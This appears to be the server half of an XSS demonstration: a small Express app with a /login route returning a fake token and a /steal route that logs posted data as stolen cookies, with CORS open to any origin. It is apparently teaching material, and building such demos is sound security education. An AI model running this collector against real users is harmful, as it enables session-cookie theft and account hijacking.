import express, { application } from 'express';
import cors from 'cors';
import cookieParser from 'cookie-parser';

const app = express();
const port = process.env.PORT || 4000;

app.use(cors());
app.use(express.json());
app.use(cookieParser());

app.post('/login', (req, res) => {
  console.log('login requested');
  res.send('thisisafakexsstokenforthedemo').status(200).end();
});

app.post('/steal', (req, res) => {
  console.log('Cookie Stolen => ', req.body);
});

app.listen({ port }, () => {
  console.log(`The server is up on port ${port}!`);
});
